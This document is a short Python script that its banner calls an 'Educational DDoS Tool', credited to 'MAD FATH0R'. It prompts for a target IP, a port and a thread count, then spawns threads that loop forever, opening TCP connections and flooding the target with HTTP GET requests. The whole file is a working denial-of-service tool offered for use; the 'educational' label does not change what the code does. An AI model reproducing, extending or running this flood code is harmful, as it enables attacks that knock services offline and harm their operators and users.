import socket
import threading
import time
import os

# Clean Stylish MF Banner
def banner():
    os.system('clear')
    logo = r"""
███╗   ███╗███████╗
████╗ ████║██╔════╝
██╔████╔██║█████╗  
██║╚██╔╝██║██╔══╝  
██║ ╚═╝ ██║███████╗
╚═╝     ╚═╝╚══════╝
    """
    print(logo)
    print("💀 TOOL: MF - MADE BY MAD FATH0R 💀")
    print("🔗 GitHub: https://github.com/pkgmafuj")
    print("🚀 Educational DDoS Tool | Kali Linux Style\n")
    time.sleep(1)

# DDoS Attack Function
def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + bytes(ip, 'utf-8') + b"\r\n\r\n")
            s.close()
            print(f"[+] MF: Packet sent to {ip}:{port}")
        except:
            print("[-] MF: Packet failed!")

# Show the Banner
banner()

# User Inputs
ip = input("🌐 Target IP: ")
port = int(input("🚪 Target Port: "))
threads = int(input("🔁 Threads: "))

# Start Attack Threads
for i in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()
